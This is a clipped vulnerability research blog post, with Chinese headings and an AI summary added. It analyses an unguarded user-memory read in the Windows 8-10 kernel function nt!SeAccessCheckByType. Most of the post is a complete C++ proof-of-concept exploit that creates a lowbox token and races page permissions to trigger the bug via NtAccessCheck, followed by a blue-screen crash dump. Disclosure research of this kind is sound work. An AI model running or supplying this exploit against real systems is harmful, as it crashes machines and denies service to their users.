---
title: "Windows Kernel Local Denial-of-Service #4: nt!NtAccessCheck and family (Windows 8-10)"
source: https://j00ru.vexillium.org/2017/04/windows-kernel-local-denial-of-service-4/
source_host: j00ru.vexillium.org
clip_date: 2026-09-09T00:09:52+08:00
trace_id: 9c1f89ea-2b9a-43ad-9a77-44a51b78c41e
content_hash: 13b101d9960a038f149f8632b4653af8e12cc448e14254ab774c768264d4c5e9
status: synced
tags:
  - 漏洞分析
  - 内核
series: null
feed_source: j00ru
ai_summary: TL;DR：Windows 8-10 内核函数 nt!SeAccessCheckByType 对用户态指针缺少异常保护，经 NtAccessCheck 等系统调用可触发内存权限竞争导致内核蓝屏，实现本地拒绝服务。
ai_summary_style: key-points
images_status:
  total: 3
  succeeded: 3
  failed_urls: []
notion_page_id: 3d575244-d011-81ba-bd6f-d9981a9d34e6
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：Windows 8-10 内核函数 nt!SeAccessCheckByType 对用户态指针缺少异常保护，经 NtAccessCheck 等系统调用可触发内存权限竞争导致内核蓝屏，实现本地拒绝服务。
> 
> - **漏洞入口：** nt!SeAccessCheckByType 的内部缺陷可由 NtAccessCheck、NtAccessCheckByType、NtAccessCheckByTypeResultList 三个系统调用到达，影响所有从 Windows 8 开始的版本，与 AppContainer 使用的 lowbox token 机制相关。
> - **根因：** 函数虽有 10 个 try/except 块，但反编译显示仍有两条读取用户内存的指令未受异常保护；两处读取都间接来自 AccessStatus 指针，可对任意无效用户地址执行解引用。
> - **触发条件：** 需满足 TOKEN_LOWBOX 标志（v22->TokenFlags & 0x4000）等一系列条件进入与日志记录相关的代码路径；PoC 使用未文档化的 NtCreateLowBoxToken 创建低盒令牌，并模仿 ntdll!RtlCheckTokenMembershipEx 的调用方式。
> - **竞争利用：** 攻击线程持续将 AccessStatus 所在内存页在 PAGE_NOACCESS 与 PAGE_READWRITE 间切换，在函数最后一次受保护写入与未受保护读取之间使指针失效；2 核及以上机器通常 1 秒内即可触发未处理异常。
> - **验证结果：** 崩溃为 KMODE_EXCEPTION_NOT_HANDLED (0x1E)，异常码 0xc0000005，崩溃点位于 nt!SeAccessCheckByType+0x706 的 cmp dword ptr [eax],0，试图读取非法地址 0x005a0000，最终蓝屏。

After a short break, we’re back with another local Windows kernel DoS. As a quick reminder, this is the fourth post in the series, and links to the previous ones can be found below:

-   [Windows Kernel Local Denial-of-Service #3: nt!NtDuplicateToken (Windows 7-8)](https://j00ru.vexillium.org/?p=3187)
-   [Windows Kernel Local Denial-of-Service #2: win32k!NtDCompositionBeginFrame (Windows 8-10)](https://j00ru.vexillium.org/?p=3151)
-   [Windows Kernel Local Denial-of-Service #1: win32k!NtUserThunkedMenuItemInfo (Windows 7-10)](https://j00ru.vexillium.org/?p=3101)

## 漏洞概述

The bug we’re discussing today resides in an internal `nt!SeAccessCheckByType` function, reachable via three system calls: `NtAccessCheck`, `NtAccessCheckByType` and `NtAccessCheckByTypeResultList`. All Windows versions starting with Windows 8 are affected, which is caused by the fact that the relevant code area is specific to so-called *lowbox tokens* (used by AppContainers), a mechanism that was only introduced in Windows 8. Similarly to the past issues, this one was also discovered by a Bochspwn-like instrumentation, and is caused by an unsafe access to user-mode memory (not guarded by adequate exception handling).

The declaration of the `NtAccessCheck` syscall, which we will use in our exploit, is shown below:

```
NTSTATUS WINAPI NtAccessCheck(
  _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
  _In_ HANDLE ClientToken,
  _In_ ACCESS_MASK DesiredAccess,
  _In_ PGENERIC_MAPPING GenericMapping,
  _Out_writes_bytes_(*PrivilegeSetLength) PPRIVILEGE_SET PrivilegeSet,
  _Inout_ PULONG PrivilegeSetLength,
  _Out_ PACCESS_MASK GrantedAccess,
  _Out_ PNTSTATUS AccessStatus
  );
```

Interestingly, the `nt!SeAccessCheckByType` routine is very well aware of the fact that it operates on pointers provided by client applications, as evidenced by the number of try/except constructs which are present inside of the function. Their exact number can be determined by looking at the identifiers written to the `TryLevel` field of the local SEH frame (`EH3_EXCEPTION_REGISTRATION` structure):

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/838a62d44f43d8c4.png)

## 未保护指令定位

As can be seen, the function has a total of 10 try/except blocks (identifiers 0-9), and so a great majority of user-mode memory references are correctly protected. However, there are still two instructions reading from the process memory which don’t have exception handling enabled (on the example of ntoskrnl.exe from Windows 10 1607 32-bit):

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bd61903f45269764.png)

What isn’t clear from the context is that both the EDX and EAX registers point to the value of a client pointer passed in through the `PNTSTATUS AccessStatus` syscall parameter. If we use the Hex-Rays decompiler over the above code, the raw output should be as follows:

```c
  if ( v154 && v22 && (v156 || !v126 && v22->TokenFlags & 0x4000 && v21 >= 0 && (*v43 < 0 || HIBYTE(v127))) )
  {
    AlpcpEnterCriticalRegion();
    ExAcquireResourceSharedLite(v22->TokenLock, 1u);
    v49 = *(_DWORD *)a11 >= 0;
    if ( v153[0] )
      v50 = v130;
    else
      v50 = (int)v22->TrustLevelSid;
    SeLogAccessFailure(v22, v50, v50, (int)v154, v20 | v152, v49);
    ExReleaseResourceLite(v22->TokenLock);
    KeLeaveCriticalRegion();
    v40 = a12;
  }
```

Here, the unsafe accesses are denoted by references to the `v43` and `a11` variables. The code area seems to be related to logging (which is a somewhat common pattern considering the nature of [DoS #2](https://j00ru.vexillium.org/?p=3151)), and the two affected instructions are quite difficult to reach, given how many conditions must first evaluate to TRUE in the above if statement. We took several steps in order to exploit the bug and trigger an unhandled kernel exception:

## 利用思路

1.  We used a concurrent thread to continuously change the permissions of the `AccessStatus` memory area. As in all previous cases, this is necessary because the unsafe access to the user-mode variable is not the first one in the function, and so we must win a tight race condition by invalidating the pointer in between the last guarded write and the unguarded read in question. In practice, this attack works reliably under <1 second for any machine with 2 or more cores.
2.  We created a lowbox token using the undocumented `NtCreateLowBoxToken` system call, to pass the `v22->TokenFlags & 0x4000` condition, which in fact checks for the `TOKEN_LOWBOX` flag.
3.  We mimicked the behavior of the internal `ntdll!RtlCheckTokenMembershipEx` function, which we found to be consistently triggering the faulty kernel code.

## PoC代码

In the end, we wound up with the following proof-of-concept C++ code, which is longer than the ones presented in previous posts (mostly due to the NT API declarations), but works as expected on both Windows 8 and 10:

```cpp
#include <Windows.h>
#include <winternl.h>
#include <sddl.h>
#include <cstdio>

extern "C" {

NTSTATUS WINAPI NtCreateLowBoxToken(
  _Out_ HANDLE * LowBoxTokenHandle,
  _In_ HANDLE TokenHandle,
  _In_ ACCESS_MASK DesiredAccess,
  _In_ OBJECT_ATTRIBUTES * ObjectAttributes OPTIONAL,
  _In_ PSID PackageSid,
  _In_ ULONG CapabilityCount OPTIONAL,
  _In_ PSID_AND_ATTRIBUTES Capabilities OPTIONAL,
  _In_ ULONG HandleCount OPTIONAL,
  _In_ HANDLE * Handles OPTIONAL
  );

NTSTATUS WINAPI RtlCreateSecurityDescriptor(
  _Out_ PSECURITY_DESCRIPTOR SecurityDescriptor,
  _In_  ULONG                Revision
  );

NTSTATUS WINAPI RtlSetOwnerSecurityDescriptor(
  _Inout_  PSECURITY_DESCRIPTOR SecurityDescriptor,
  _In_opt_ PSID                 Owner,
  _In_opt_ BOOLEAN              OwnerDefaulted
  );

NTSTATUS WINAPI RtlSetGroupSecurityDescriptor(
  _Inout_  PSECURITY_DESCRIPTOR SecurityDescriptor,
  _In_opt_ PSID                 Group,
  _In_opt_ BOOLEAN              GroupDefaulted
  );

NTSTATUS WINAPI RtlCreateAcl(
  _Out_ PACL  Acl,
  _In_  ULONG AclLength,
  _In_  ULONG AceRevision
  );

NTSTATUS WINAPI RtlAddAccessAllowedAce(
  _Inout_ PACL        Acl,
  _In_    ULONG       AceRevision,
  _In_    ACCESS_MASK AccessStatus,
  _In_    PSID        Sid
  );

NTSTATUS WINAPI RtlSetDaclSecurityDescriptor(
  _Inout_  PSECURITY_DESCRIPTOR SecurityDescriptor,
  _In_     BOOLEAN              DaclPresent,
  _In_opt_ PACL                 Dacl,
  _In_opt_ BOOLEAN              DaclDefaulted
  );

NTSTATUS WINAPI NtAccessCheck(
  _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
  _In_ HANDLE ClientToken,
  _In_ ACCESS_MASK DesiredAccess,
  _In_ PGENERIC_MAPPING GenericMapping,
  _Out_writes_bytes_(*PrivilegeSetLength) PPRIVILEGE_SET PrivilegeSet,
  _Inout_ PULONG PrivilegeSetLength,
  _Out_ PACCESS_MASK GrantedAccess,
  _Out_ PNTSTATUS AccessStatus
  );

}  // extern "C"

namespace globals {
  PNTSTATUS AccessStatus;
}  // namespace globals

DWORD ThreadRoutine(LPVOID lpParameter) {
  DWORD flOldProtect;

  // Indefinitely alternate between R/W and NOACCESS rights.
  while (1) {
    VirtualProtect(globals::AccessStatus, sizeof(NTSTATUS), PAGE_NOACCESS, &flOldProtect);
    VirtualProtect(globals::AccessStatus, sizeof(NTSTATUS), PAGE_READWRITE, &flOldProtect);
  }
}

VOID Cleanup(PSID Sid, HANDLE hToken, HANDLE hLowBoxToken, HANDLE hImpersonatedToken, PSID NtSid) {
  if (Sid != NULL) {
    LocalFree(Sid);
  }
  if (hToken != NULL) {
    CloseHandle(hToken);
  }
  if (hLowBoxToken != NULL) {
    CloseHandle(hLowBoxToken);
  }
  if (hImpersonatedToken != NULL) {
    CloseHandle(hImpersonatedToken);
  }
  if (NtSid != NULL) {
    LocalFree(NtSid);
  }
}

int main() {
  // Create a SID.
  WCHAR SidString[] = L"S-1-15-2-1-1-1-1-1-1-1";
  PSID Sid = NULL;
  if (!ConvertStringSidToSid(SidString, &Sid)) {
    printf("ConvertStringSidToSid failed, %d\n", GetLastError());
    return 1;
  }

  // Open the current process token.
  HANDLE hToken = NULL;
  OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);

  // Create a lowbox token based on the process token.
  OBJECT_ATTRIBUTES ObjectAttributes;
  InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

  HANDLE hLowBoxToken = NULL;
  NTSTATUS st = NtCreateLowBoxToken(&hLowBoxToken, hToken, TOKEN_ALL_ACCESS, &ObjectAttributes, Sid, 0, NULL, 0, NULL);
  if (!NT_SUCCESS(st)) {
    printf("NtCreateLowBoxToken failed, %x\n", st);
    Cleanup(Sid, hToken, NULL, NULL, NULL);
    return 1;
  }

  // Create an impersonation token based on the lowbox one.
  HANDLE hImpersonatedToken = NULL;
  if (!DuplicateToken(hLowBoxToken, SecurityImpersonation, &hImpersonatedToken)) {
    printf("DuplicateToken failed, %d\n", GetLastError());
    Cleanup(Sid, hToken, hLowBoxToken, NULL, NULL);
    return 1;
  }

  // Create an NT AUTHORITY sid.
  SID_IDENTIFIER_AUTHORITY NtSidAuth = SECURITY_NT_AUTHORITY;
  PSID NtSid;

  if (!AllocateAndInitializeSid(&NtSidAuth, 1, 4, 0, 0, 0, 0, 0, 0, 0, &NtSid)) {
    printf("AllocateAndInitializeSid failed, %d\n", GetLastError());
    Cleanup(Sid, hToken, hLowBoxToken, hImpersonatedToken, NULL);
    return 1;
  }

  // Create a security descriptor based on the NT sid.
  SECURITY_DESCRIPTOR sc;
  BYTE acl[0xA0];
  if ((st = RtlCreateSecurityDescriptor(&sc, 1),                        !NT_SUCCESS(st)) ||
      (st = RtlSetOwnerSecurityDescriptor(&sc, NtSid, FALSE),           !NT_SUCCESS(st)) ||
      (st = RtlSetGroupSecurityDescriptor(&sc, NtSid, FALSE),           !NT_SUCCESS(st)) ||
      (st = RtlCreateAcl((PACL)acl, sizeof(acl), ACL_REVISION),         !NT_SUCCESS(st)) ||
      (st = RtlAddAccessAllowedAce((PACL)acl, ACL_REVISION, 1, NtSid),  !NT_SUCCESS(st)) ||
      (st = RtlSetDaclSecurityDescriptor(&sc, TRUE, (PACL)acl, FALSE),  !NT_SUCCESS(st))) {
    printf("One of the Rtl functions failed during security description creation, %x\n", st);
    Cleanup(Sid, hToken, hLowBoxToken, hImpersonatedToken, NtSid);
    return 1;
  }

  // Allocate memory for the structure whose privileges are being flipped.
  globals::AccessStatus = (PNTSTATUS)VirtualAlloc(NULL, sizeof(NTSTATUS), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // Create the racing thread.
  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadRoutine, NULL, 0, NULL);
  
  //
  // Run an infinite loop trying to trigger the unhandled exception.
  //
  GENERIC_MAPPING RtlpCheckTokenMembershipGenericMapping = { 0x20001, 0x20000, 0x20000, 0x1F0001 }; // Ripped from NTDLL.DLL.
  PRIVILEGE_SET PrivilegeSet;
  DWORD PrivilegeSetLength = sizeof(PrivilegeSet);
  ACCESS_MASK GrantedAccess;

  while (1) {
    NtAccessCheck(&sc,
                  hImpersonatedToken,
                  1,
                  &RtlpCheckTokenMembershipGenericMapping,
                  &PrivilegeSet,
                  &PrivilegeSetLength,
                  &GrantedAccess,
                  globals::AccessStatus);
  }

  return 0;
}
```

Starting the program instantly yields the following Blue Screen of Death:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/10daaa4fda5df733.png)

## 崩溃验证

The full crash summary is as follows:

```yaml
KMODE_EXCEPTION_NOT_HANDLED (1e)
This is a very common bugcheck.  Usually the exception address pinpoints
the driver/function that caused the problem.  Always note this address
as well as the link date of the driver/image that contains this address.
Arguments:
Arg1: c0000005, The exception code that was not handled
Arg2: 81504096, The address that the exception occurred at
Arg3: 00000000, Parameter 0 of the exception
Arg4: 005a0000, Parameter 1 of the exception

Debugging Details:
------------------

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.

FAULTING_IP: 
nt!SeAccessCheckByType+706
81504096 833800          cmp     dword ptr [eax],0

EXCEPTION_PARAMETER2:  005a0000

BUGCHECK_STR:  0x1E_c0000005_R

DEFAULT_BUCKET_ID:  WIN8_DRIVER_FAULT

PROCESS_NAME:  AccessCheck.ex

CURRENT_IRQL:  0

ANALYSIS_VERSION: 6.3.9600.17237 (debuggers(dbg).140716-0327) x86fre

EXCEPTION_RECORD:  86bf9938 -- (.exr 0xffffffff86bf9938)
ExceptionAddress: 81504096 (nt!SeAccessCheckByType+0x00000706)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 005a0000
Attempt to read from address 005a0000

TRAP_FRAME:  86bf9a14 -- (.trap 0xffffffff86bf9a14)
ErrCode = 00000000
eax=005a0000 ebx=00000001 ecx=8e087200 edx=00000000 esi=8a32ec00 edi=00000000
eip=81504096 esp=86bf9a88 ebp=86bf9bbc iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
nt!SeAccessCheckByType+0x706:
81504096 833800          cmp     dword ptr [eax],0    ds:0023:005a0000=c0000022
Resetting default scope

LAST_CONTROL_TRANSFER:  from 8161b491 to 815a0ee4

STACK_TEXT:  
86bf8f64 8161b491 00000003 b4954df8 00000065 nt!RtlpBreakWithStatusInstruction
86bf8fb8 8161aede 86b7f340 86bf93d8 86bf940c nt!KiBugCheckDebugBreak+0x1f
86bf93ac 8159fd3a 0000001e c0000005 81504096 nt!KeBugCheck2+0x73a
86bf93d0 8159fc71 0000001e c0000005 81504096 nt!KiBugCheck2+0xc6
86bf93f0 8164c18a 0000001e c0000005 81504096 nt!KeBugCheckEx+0x19
86bf940c 815b3552 86bf9938 816bd328 86bf9500 nt!KiFatalExceptionHandler+0x1a
86bf9430 815b3524 86bf9938 816bd328 86bf9500 nt!ExecuteHandler2+0x26
86bf94f0 814a86b1 86bf9938 86bf9500 00010037 nt!ExecuteHandler+0x24
86bf991c 815aeee5 86bf9938 00000000 86bf9a14 nt!KiDispatchException+0x127
86bf9988 815b17e7 00000000 00000000 00000000 nt!KiDispatchTrapException+0x51
86bf9988 81504096 00000000 00000000 00000000 nt!KiTrap0E+0x1a7
86bf9bbc 81553419 00000001 00000001 00000000 nt!SeAccessCheckByType+0x706
86bf9bec 815ae127 00a5f9ec 00000078 00000001 nt!NtAccessCheck+0x29
86bf9bec 770c4d50 00a5f9ec 00000078 00000001 nt!KiSystemServicePostCall
00a5f7fc 770c102a 008e1601 00a5f9ec 00000078 ntdll!KiFastSystemCallRet
00a5f800 008e1601 00a5f9ec 00000078 00000001 ntdll!NtAccessCheck+0xa
```

And that’s it.:) Thanks for reading and see you next time!
